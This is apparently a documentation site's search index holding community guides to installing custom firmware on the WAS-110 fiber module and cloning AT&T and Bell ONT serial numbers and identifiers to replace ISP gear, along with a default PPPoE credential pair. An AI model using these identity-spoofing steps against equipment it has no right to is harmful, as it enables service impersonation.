{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Guides","text":""},{"location":"gpon/","title":"Gigabit Passive Optical Network","text":""},{"location":"guides/bridge-the-bce-inc-giga-hub/","title":"Bridge the BCE Inc. Giga Hub","text":"<p>Bell MTS and Aliant subscribers...</p> <p>Enabling bridge mode will produce an error code<sup>1</sup>. Follow the disable bridge mode steps below to revert back to router mode.</p> <p>The Giga Hub's bridge mode operates as a pseudo-bridge or rather in IP/PPPoE passthrough mode. It can be enabled or disabled either remotely by a support technician, or by pressing and holding a secret button combination outlined in this guide.</p>"},{"location":"guides/bridge-the-bce-inc-giga-hub/#enable-bridge-mode","title":"Enable bridge mode","text":"<p>Hold the Reset and OK buttons simultaneously for 7 seconds.</p>"},{"location":"guides/bridge-the-bce-inc-giga-hub/#whats-happening-behind-the-scenes","title":"What's happening behind the scenes","text":"<p>When enabling bridge mode, the Giga Hub performs the following XMO actions:</p> Action XMO Path Value Disabling WiFi AP[@Alias=PRIV0] <code>Device/WiFi/AccessPoints/AccessPoint[Alias='PRIV0']/Enable</code> False Disabling WiFi AP[@Alias=GUEST1] <code>Device/WiFi/AccessPoints/AccessPoint[Alias='GUEST1']/Enable</code> False Disabling WiFi SSID[@Alias=WL_PRIV] <code>Device/WiFi/SSIDs/SSID[Alias='WL_PRIV']/Enable</code> False Disabling WiFi SSID[@Alias=WL_GUEST] <code>Device/WiFi/SSIDs/SSID[Alias='WL_GUEST']/Enable</code> False Disabling USB <code>Device/USB/Enable</code> False Disabling BR_LAN bridge <code>Device/IP/Interfaces/Interface[Alias='IP_BR_LAN']/Enable</code> False Disabling BR_GUEST bridge <code>Device/IP/Interfaces/Interface[Alias='IP_BR_GUEST']/Enable</code> False Disabling DHCPv4 server <code>Device/DHCPv4/Server/Enable</code> False Disabling Password recovery <code>Device/Services/Notification/CredentialsRequestEnable</code> False Reset default PPPoE username <code>Device/PPP/Interfaces/Interface/Username</code> sc5689x Reset default PPPoE password <code>Device/PPP/Interfaces/Interface/Password</code> 7yTa3wXU <p>Danger</p> <p>DO NOT under any circumstances assign the paths manually using a XMO client; they're guaranteed to soft-brick the Giga Hub.</p>"},{"location":"guides/bridge-the-bce-inc-giga-hub/#disable-bridge-mode","title":"Disable bridge mode","text":"<p>Hold the Reset and either the Up or Down arrow buttons simultaneously for 7 seconds.</p> <ol> <li> <p>https://support.bell.ca/internet/connection-help/troubleshooting_error_codes_with_my_home_hub_modem \u21a9</p> </li> </ol>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/","title":"Install 8311 community firmware on the BFW Solutions WAS-110","text":"<p>Out of the box, the WAS-110 is not fully compatible with varying ISP OLT configurations, with issues ranging from  vendor-specific managed entities to VEIP to IEEE standards such as 802.1X and 802.1ad. Due to these  incompatibilities and discovered bugs, a community firmware<sup>1</sup> has been curated to fix any impeding issues<sup>2</sup>. </p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#host-setup","title":"Host setup","text":"<p>Plug the WAS-110 into a 10-gigabit compatible SFP+ host interface, such as a NIC, media converter, and/or network switch.</p> <p>Rx loss</p> <p>The WAS-110 running the default Azores firmware will trigger RX_LOS if the SC/APC fiber cable is unplugged or  inactive. Some host interfaces will enter a power-saving state, making the WAS-110 inaccessible.</p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#download-firmware","title":"Download firmware","text":"<p>The community firmware comes in two (2) variants: basic and bfw; for the purposes of this guide, we'll focus on the recommended basic firmware, which can be downloaded at:</p> <p>https://github.com/djGrrr/8311-was-110-firmware-builder/releases/latest</p> <p>As an example, the following command downloads the basic firmware into the current users download directory.</p>  Windows macOS /  Linux <pre><code>curl --output-dir %UserProfile%\\Downloads -O https://github.com/djGrrr/8311-was-110-firmware-builder/releases/download/v2.6.1/WAS-110_8311_firmware_mod_v2.6.1_basic.exe\n</code></pre> <pre><code>curl --output-dir ~/Downloads -O https://github.com/djGrrr/8311-was-110-firmware-builder/releases/download/v2.6.1/WAS-110_8311_firmware_mod_v2.6.1_basic.7z\n</code></pre> <p>The basic firmware is based on a vanilla MaxLinear OpenWrt 19.07 build from Potrontec. Additionally, it  includes customized luci web interfaces for hassle-free masquerading and the aforementioned fixes. And unlike the bfw  variant, it does not include the abysmal BFW patches and cruft.</p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#extract-download","title":"Extract download","text":"<p>The community firmware upgrade comes bundled as a self-extracting executable ( Windows only) or a 7-Zip archive and includes:</p> <code>local-upgrade.img</code> <p>Used with the Azores web upgrade utility.</p> <code>local-upgrade.tar</code> <p>Used with the universal shell upgrade command sequence.</p> <p>To extract the archive to a temporary directory, execute the following command(s):</p> <p>Replace <code>&lt;version&gt;</code> with the downloaded version.</p>  Windows macOS Linux <p>The following commands assume Homebrew is installed</p> <pre><code>brew install sevenzip\n7zz e '-i!local-upgrade.*' ~/Downloads/WAS-110_8311_firmware_mod_&lt;version&gt;_basic.7z -o/tmp\n</code></pre> <p>The following commands assume Debian or derivatives<sup>3</sup></p> <pre><code>sudo apt-get install p7zip-full\n7z e '-i!local-upgrade.*' ~/Downloads/WAS-110_8311_firmware_mod_&lt;version&gt;_basic.7z -o/tmp #(1)!\n</code></pre>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#self-extracting-executable","title":"Self-extracting Executable","text":"<p>Double-click on the exe file in Windows File Explorer. </p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#7-zip","title":"7-zip","text":"<pre><code>7z e \"-i!local-upgrade.*\" %UserProfile%\\Downloads\\WAS-110_8311_firmware_mod_&lt;version&gt;_basic.7z -o%Temp%\\8311\n</code></pre>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#set-a-static-ip","title":"Set a static IP","text":"<p>The default IP address of the WAS-110 is <code>192.168.11.1/24</code>. To connect successfully, a static IP address must be assigned to the host interface, such as <code>192.168.11.2/24</code><sup>4</sup>.</p>  Windows macOS Linux Ubiquiti <p>Run Command Prompt as Administrator</p> <ol> <li>Press Win + R</li> <li>In the Run dialog box, type <code>cmd</code> into the input field and then press    Ctrl + Shift + Enter. </li> </ol> <pre><code>netsh interface ip show config\nnetsh interface ipv4 set address name=\"&lt;interface name&gt;\" static 192.168.11.2 255.255.255.0 192.168.11.1\nnetsh interface ipv4 set interface \"&lt;interface name&gt;\" mtu=1500\n</code></pre> For the shameless mouse clickers... <p>If you are more comfortable with the Windows GUI, follow the manual steps outlined by Microsoft at:</p> <p>https://support.microsoft.com/en-us/windows/change-tcp-ip-settings-bd0a07af-15f5-cd6a-363f-ca2b6f391ace</p> <p>Replace <code>&lt;service&gt;</code> with the SFP+ interface name.</p> <pre><code>sudo networksetup -listallnetworkservices\nsudo networksetup -setmanual &lt;service&gt; 192.168.11.2 255.255.255.0 192.168.11.1\n</code></pre> For the shameless mouse clickers... <p>If you are more comfortable with the macOS GUI, follow the manual steps outlined by Apple at:</p> <ul> <li>https://support.apple.com/en-ca/guide/mac-help/mchlp2718/mac</li> <li>https://support.apple.com/en-ca/guide/mac-help/mh14129/mac</li> </ul> <p>The following commands set the IP address temporarily until the next power cycle</p> <p>For persistence check your OS documentation, such as Debian Network Configuration</p> <p>The following commands must be run as root <code>su -</code> or prepended with <code>sudo</code></p> <pre><code>ip link show\nethtool &lt;interface&gt;\nip address show\nip address flush dev &lt;interface&gt;\nip route flush dev &lt;interface&gt;\nip address add 192.168.11.2/24 dev &lt;interface&gt;\nip address show dev &lt;interface&gt;\n</code></pre> <p>The following command sets the IP address temporarily until the next power cycle</p> <p>Replace <code>&lt;interface&gt;</code> with the SFP+ interface name e.g. <code>eth9</code> for the UDM-SE</p> <pre><code>ip addr add dev &lt;interface&gt; local 192.168.11.2/24\niptables -t nat -A POSTROUTING -o &lt;interface&gt; -d 192.168.11.0/24 -j SNAT --to 192.168.11.2\n</code></pre>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#dump-and-backup-firmware","title":"Dump &amp; backup firmware optional","text":"<ol> <li> <p>Enable SSH from the web UI by following the steps outlined below in the shell upgrade section.</p> </li> <li> <p>Login to the WAS-110 remote shell over SSH using the root shell credentials.</p> <pre><code>ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 \n</code></pre> </li> <li> <p>Execute the following command sequence from the WAS-110 remote shell to dump its volumes into the temp directory.</p> <pre><code>mkdir -p /tmp/fw; for part in kernelA bootcoreA rootfsA kernelB bootcoreB rootfsB; do VOL=$(ubinfo /dev/ubi0 -N \"$part\" | grep \"Volume ID\" | awk '{print $3}'); [ -n \"$VOL\" ] &amp;&amp; { DEV=\"/dev/ubi0_$VOL\"; OUT=\"/tmp/fw/ubi0_$VOL-$part.img\"; echo \"Dumping $part ($DEV) to: $OUT\"; dd if=\"$DEV\" of=\"$OUT\"; }; done; exit\n</code></pre> </li> <li> <p>Execute the following command from the host PC terminal to back-up the dumped volumes to your local user directory.</p>  Windows macOS /  Linux <pre><code>cd /D %UserProfile% &amp; scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1:/tmp/fw/ubi* .\n</code></pre> <pre><code>cd ~/; scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa 'root@192.168.11.1:/tmp/fw/ubi*' ./\n</code></pre> </li> </ol>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#shell-upgrade","title":"Shell upgrade recommended","text":"<p>The extracted <code>local-upgrade.tar</code> includes a safer upgrade script in comparison to the built-in web UI.</p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#enable-ssh","title":"Enable SSH","text":"<p>SSH must be enabled from the web UI prior to running the shell commands.</p> <p></p> <ol> <li>Within a web browser, navigate to     https://192.168.11.1/html/main.html#service/servicecontrol    and, if asked, input the admin web credentials.</li> </ol> <p></p> <ol> <li>From the Service Control page, check the SSH checkbox and click Save.</li> </ol>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#upgrade-firmware","title":"Upgrade firmware","text":"<p>Run the following commands from the host terminal to upgrade to the 8311 community firmware.</p> <p>Input the root shell credentials when asked.</p>  Windows macOS /  Linux <pre><code>scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa %Temp%\\8311\\local-upgrade.tar root@192.168.11.1:/tmp/\nssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 \"tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh &amp;&amp; /tmp/upgrade.sh -y -r /tmp/local-upgrade.tar\"\n</code></pre> <pre><code>scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa /tmp/local-upgrade.tar root@192.168.11.1:/tmp/\nssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh &amp;&amp; /tmp/upgrade.sh -y -r /tmp/local-upgrade.tar'\n</code></pre> <p>Once rebooted, enjoy the labor of love of the 8311 community. As a first step, it is recommended to perform a supplementary upgrade.</p> <p>New SSH host keys will be generated</p> <p>Don't be alarmed when attempting to connect over SSH into the newly installed firmware and the following warning is presented:</p> <pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that a host key has just been changed.\nThe fingerprint for the ECDSA key sent by the remote host is\nSHA256:Y3WzWezEYQi5374JfEa4KMm2nqfkj7raMyZIi6TS+X4.\nPlease contact your system administrator.\nAdd correct host key in /home/8311/.ssh/known_hosts to get rid of this message.\nOffending ECDSA key in /home/8311/.ssh/known_hosts:1\nHost key for 192.168.11.1 has changed and you have requested strict checking.\nHost key verification failed.\n</code></pre> <p>Simply delete the old host ID by running the following command and retry:</p> <pre><code>ssh-keygen -R 192.168.11.1\n</code></pre>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#web-ui-upgrade","title":"Web UI upgrade not recommended","text":"<p>Proceed with caution!</p> <p>The Azores firmware upgrade utility on occasion is known to soft-brick itself. To recover, a host device with serial breakout on SFP pins 2 (rx) and 7 (tx) will be required.</p> <p>Alternatively, jump to the safer shell upgrade within this guide.</p> <p></p> <ol> <li>Within a web browser, navigate to     https://192.168.11.1/html/main.html#admin/upgrade    and, if asked, input the admin web credentials. </li> </ol> <p></p> <p>50/50 chance of soft-bricking the WAS-110 if proceeded!</p> <ol> <li>From the Firmware Upgrade page, browse for <code>local-upgrade.img</code> from the extracted download, and click     Upgrade.</li> </ol> <p>Patiently wait out the process, 4 to 5 minutes, or until the web session becomes unresponsive.</p> Run a continuous ping <p>To recieve an early indication that the WAS-110 has completed its upgrade reboot cycle, run a continuous ping:</p>  Windows macOS /  Linux <pre><code>ping -t 192.168.11.1\n</code></pre> <pre><code>ping 192.168.11.1\n</code></pre> <p>Once rebooted, enjoy the labor of love of the 8311 community. As a first step, it is recommended to perform a supplementary upgrade.</p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#supplementary-upgrades","title":"Supplementary upgrades","text":""},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#ab-architecture","title":"A/B architecture","text":"<pre><code>block-beta\n    block:BOOT\n        columns 1\n        mtd0(\"&lt;b&gt;uboot&lt;/b&gt;\\n/dev/mtd0\")\n        mtd1(\"&lt;b&gt;ubootconfigA&lt;/b&gt;\\n/dev/mtd1\")\n        mtd2(\"&lt;b&gt;ubootconfigB&lt;/b&gt;\\n/dev/mtd2\")\n    end\n    block:UBI(\"/dev/ubi0\")\n        columns 2\n        block A\n            columns 1\n            mtd9(\"&lt;b&gt;kernelA&lt;/b&gt;\\n/dev/mtd9\")\n            mtd10(\"&lt;b&gt;bootcoreA&lt;/b&gt;\\n/dev/mtd10\")\n            mtd11(\"&lt;b&gt;rootfsA&lt;/b&gt;\\n/dev/mtd11\")\n        end\n        block B\n            columns 1\n            mtd12(\"&lt;b&gt;kernelB&lt;/b&gt;\\n/dev/mtd12\")\n            mtd13(\"&lt;b&gt;bootcoreB&lt;/b&gt;\\n/dev/mtd13\")\n            mtd14(\"&lt;b&gt;rootfsB&lt;/b&gt;\\n/dev/mtd14\")\n        end\n        block:PERSIST:2\n            columns 1\n            mtd15(\"&lt;b&gt;ptconf&lt;/b&gt;\\n/dev/mtd15\")\n            mtd16(\"&lt;b&gt;rootsfs_data&lt;/b&gt;\\n/dev/mtd16\")\n        end\n    end\n    classDef transparentBlock fill:transparent,stroke:transparent;\n    classDef boldTitle fill:transparent,stroke:transparent,font-weight:bold;\n    class BOOT,PERSIST transparentBlock\n    class A,B boldTitle</code></pre> <p>The WAS-110 uses an A/B architecture, which means there are two adjacent firmware images: an active image (the currently running and firmware) and an inactive image. Either image can be selected as active, and upon upgrade, the inactive image will be overwritten and become the newly active image after reboot, i.e. committed image.</p> <p>Furthermore, the OLT has the capability to select the active firmware image, upgrade the inactive image, and reboot the ONT. It is therefore recommended to install the community firmware on both A and B slots.</p>"},{"location":"guides/install-8311-community-firmware-on-the-bfw-solutions-was-110/#8311-web-ui-upgrade","title":"Web UI upgrade safe","text":"<p>Integrity first and foremost</p> <p>The 8311 community firmware re-uses the safe shell upgrade logic throughout. Those who prefer the CLI may continue to use the shell upgrade method going forward.</p> <p></p> <ol> <li> <p>Within a web browser, navigate to     https://192.168.11.1/cgi-bin/luci/admin/8311/firmware    and, if asked, input your root password.</p> </li> <li> <p>From the Firmware page, browse for <code>local-upgrade.tar</code> from the extracted download, and click Upload.</p> </li> </ol> <ol> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> <li> <p>https://github.com/djGrrr/8311-xgspon-bypass</p> <p>https://github.com/djGrrr/8311-was-110-firmware-builder/blob/master/mods/ \u21a9</p> </li> <li> <p>https://www.debian.org/derivatives/ \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/Internet_Protocol_version_4#First_and_last_subnet_addresses \u21a9</p> </li> </ol>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/","title":"Masquerade as the AT&amp;T Inc. BGW320-500/505 on XGS-PON with the BFW Solutions WAS-110","text":""},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#determine-if-youre-an-xgs-pon-subscriber","title":"Determine if you're an XGS-PON subscriber","text":"<p>2 Gbps or higher tiers</p> <p>If you're subscribed to 2 GIG speed or a similar 2 Gbps or higher tier, skip past to Purchase a WAS-110.</p> <p>There are two (2) methods to determine if you're an XGS-PON subscriber. First, through the web UI Fiber  Status page, and second, by inspecting the SFP transceiver.</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#with-the-web-ui","title":"with the web UI recommended","text":"<ol> <li>Within a web browser, navigate to    http://192.168.1.254/cgi-bin/fiberstat.ha</li> </ol> <p>If the wave length matches 1270 nm, you're subscribed on XGS-PON.</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#with-the-transceiver","title":"with the transceiver","text":"<p>First, identify the color of the bale clasp. If the clasp is orange, continue by carefully pulling out the  transceiver by engaging the bale clasp and latch. If the label on the transceiver contains the text XGS-PON or  1270 TX, you're subscribed on XGS-PON.</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#purchase-a-was-110","title":"Purchase a WAS-110","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the  8311 Discord community server.</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>Although, not strictly necessary for AT&amp;T, the community firmware is highly recommended for masquerading with the  WAS-110 and used for the remainder of this guide. To install the community firmware, follow the steps outlined in the  community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>To successfully masquerade on XGS-PON, the original ONT serial number is mandatory. It, along with other key  identifiers are available on the bottom label of the BGW320-500/505, color-coordinated in the following depiction:</p> BGW320-500BGW320-505 <p></p> <p></p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to     https://192.168.11.1/cgi-bin/luci/admin/8311/config     and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>Reminder</p> <p>Replace the mandatory  PON Serial Number with the provisioned value on the bottom label of the BGW320-500/505.</p> BGW320-500BGW320-505 Attribute Value Mandatory Remarks PON Serial Number (ONT ID) HUMA04831122 ONT ID Equipment ID iONT320500G Hardware Version BGW320-500_2.1 Sync Circuit Pack Version Software Version A BGW320_4.27.7 Version listing Software Version B BGW320_4.27.7 Version listing MIB File /etc/mibs/prx300_1U.ini PPTP i.e. default value Attribute Value Mandatory Remarks PON Serial Number (ONT ID) NOKA04831122 ONT ID Equipment ID iONT320505G Hardware Version BGW320-505_2.2 Sync Circuit Pack Version Software Version A BGW320_4.27.7 Version listing Software Version B BGW320_4.27.7 Version listing MIB File /etc/mibs/prx300_1U.ini PPTP i.e. default value </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5  operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p> <p>Clone the BGW320-500/505  MAC address on the router's DHCP WAN interface to avoid waiting for the 20 minute lease to expire.</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>Highlighted lines are mandatory</p> <p>Replace the mandatory  8311_gpon_sn with the provisioned value on the bottom label of the BGW320-500/505.</p> BGW320-500BGW320-505 <pre><code>fwenv_set 8311_gpon_sn HUMA03831122 # (1)!\nfwenv_set 8311_equipment_id iONT320500G\nfwenv_set 8311_hw_ver BGW320-500_2.1\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA BGW320_4.27.7\nfwenv_set 8311_sw_verB BGW320_4.27.7\n</code></pre> <ol> <li> ONT ID</li> </ol> <pre><code>fwenv_set 8311_gpon_sn NOKA03831122 # (1)!\nfwenv_set 8311_equipment_id iONT320505G\nfwenv_set 8311_hw_ver BGW320-505_2.2\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA BGW320_4.27.7\nfwenv_set 8311_sw_verB BGW320_4.27.7\n</code></pre> <ol> <li> ONT ID</li> </ol> <p>Additional details and variables are described at the original repository <sup>1</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each  environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5  operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p> <p>Clone the BGW320-500/505  MAC address on the router's DHCP WAN interface to avoid waiting for the 20 minute lease to expire.</p>"},{"location":"guides/masquerade-as-the-att-inc-bgw320-500-505-on-xgs-pon-with-the-bfw-solutions-was-110/#bgw320-500-505-software-versions","title":"BGW320-500/505 software versions","text":"<p>The OLT can utilize the software version as a provisioning attribute. It is recommended to stay updated with the software upgrades of the BGW320-500/505 if the WAS-110 reports a fake O5 state.</p> <p></p> <p>The software version can be acquired by reconnecting the BGW320-500/505 and navigating to http://192.168.1.254/cgi-bin/update.ha and replacing the <code>X</code> placeholders in the following string pattern with the version number: <code>BGW320_X.XX.X</code>.</p> <ol> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> </ol>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/","title":"Masquerade as the BCE Inc. Giga Hub on XGS-PON with the BFW Solutions WAS-110","text":""},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#determine-if-youre-an-xgs-pon-subscriber","title":"Determine if you're an XGS-PON subscriber","text":"<p>3 Gbps or higher packages</p> <p>If you're subscribed to Gigabit Fibe 3.0 or a similar 3 Gbps or higher package, skip past to Purchase a WAS-110.</p> <p>There are two (2) methods to determine if you're an XGS-PON subscriber: the simpler Web UI WAN page,  and the more comprehensive XMO API client. </p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#with-the-web-ui","title":"with the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to    https://home/?c=advancedtools/wan    and, if asked, input your Administrator password. (1)</p> <ol> <li>The default Administrator password is located on the back label of the Giga Hub.</li> </ol> </li> </ol> <p></p> <ol> <li>From the WAN page, verify the displayed current mode is XGS-PON.</li> </ol>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#with-a-xmo-client","title":"with a XMO client","text":"<p>The open-source XMO client<sup>1</sup> has a prerequisite of Python 3.10 or newer. Python installation varies by Operating System and has been outlined by the tutors at  Real Python \u2014 Python 3 Installation &amp; Setup Guide.</p> Install client <p>Open a terminal and install the open-source XMO client with:</p>  Windows macOS /  Linux <pre><code>py --version\npy -m venv venv\nvenv\\Scripts\\activate\npy -m pip install --upgrade pip \npip install https://github.com/up-n-atom/sagemcom-modem-scripts/releases/download/v0.0.4/xmo_remote_client-0.0.4-py3-none-any.whl\n</code></pre> <pre><code>python3 --version # (1)!\npython3 -m venv .venv\n. .venv/bin/activate\npython3 -m pip install --upgrade pip\npip3 install https://github.com/up-n-atom/sagemcom-modem-scripts/releases/download/v0.0.4/xmo_remote_client-0.0.4-py3-none-any.whl\n</code></pre> <ol> <li>Verify the installed Python version is &gt;= 3.10</li> </ol> Exec client <p>Finally, to determine if you're an XGS-PON subscriber, execute the following:</p> <pre><code>xmo-remote-client --password=&lt;password&gt; get-wan-mode\n</code></pre> <p>Note</p> <p>Replace the <code>&lt;password&gt;</code> argument; the default Administrator password is the S/N located on the back label of the  Giga Hub.</p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#purchase-a-was-110","title":"Purchase a WAS-110","text":"<p>The WAS-110 is available from select distributors and at a discounted rate with group buys on the  8311 Discord community server.</p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#install-community-firmware","title":"Install community firmware","text":"<p>As a prerequisite to masquerading with the WAS-110, the community firmware is necessary; follow the steps  outlined in the community firmware installation guide:</p> <p>Install 8311 community firmware on the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#was-110-masquerade-setup","title":"WAS-110 masquerade setup","text":"<p>To successfully masquerade on XGS-PON, the original ONT serial number is mandatory. It, along with other key  identifiers are available on the back label of the Giga Hub, color-coordinated in the following depiction:</p> <p></p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-web-ui","title":"from the web UI recommended","text":"<ol> <li> <p>Within a web browser, navigate to     https://192.168.11.1/cgi-bin/luci/admin/8311/config     and, if asked, input your root password.</p> As of version 2.4.0 <code>https://</code> is supported and enabled by default <p>All <code>http://</code> URLs will redirect to <code>https://</code> unless the <code>8311_https_redirect</code> environment variable is set to 0 or false.</p> </li> </ol> <p></p> <ol> <li> <p>From the 8311 Configuration page, on the PON tab, fill in the configuration with the following values:</p> <p>Reminder</p> <p>Replace the mandatory  PON Serial Number and optional  IP Host MAC address with the provisioned values on the back label of the Giga Hub.</p> Attribute Value Mandatory Remarks PON Serial Number (ONT ID) SMBS03831122 ONT S/N Equipment ID 5690 Hardware Version Fast5689EBell Sync Circuit Pack Version Software Version A SGC8400058 Version listing Software Version B SGC8400058 Version listing MIB File /etc/mibs/prx300_1V_bell.ini VEIP and more IP Host MAC Address 40:65:A3:FF:A7:B1  @MAC + 1 </li> <li> <p>Save changes and reboot from the System menu.</p> </li> </ol> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5  operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p>"},{"location":"guides/masquerade-as-the-bce-inc-giga-hub-on-xgs-pon-with-the-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>Highlighted lines are mandatory</p> <p>Replace the mandatory  8311_gpon_sn and optional  8311_iphost_mac with the provisioned values on the back label of the Giga Hub.</p> <pre><code>fwenv_set mib_file\nfwenv_set 8311_iphost_mac 40:65:A3:FF:A7:B1 # (1)!\nfwenv_set 8311_gpon_sn SMBS03831122 # (2)!\nfwenv_set 8311_equipment_id 5690\nfwenv_set 8311_hw_ver Fast5689EBell\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA SGC8400058 # (3)!\nfwenv_set 8311_sw_verB SGC8400058\nfwenv_set 8311_mib_file /etc/mibs/prx300_1V_bell.ini \n</code></pre> <ol> <li> @MAC + 1, e.g. <code>40:65:A3:FF:A7:B0</code> becomes <code>40:65:A3:FF:A7:B1</code></li> <li> ONT S/N</li> <li>Version listing</li> </ol> <p>Additional details and variables are described at the original repository <sup>2</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each  environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5  operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the 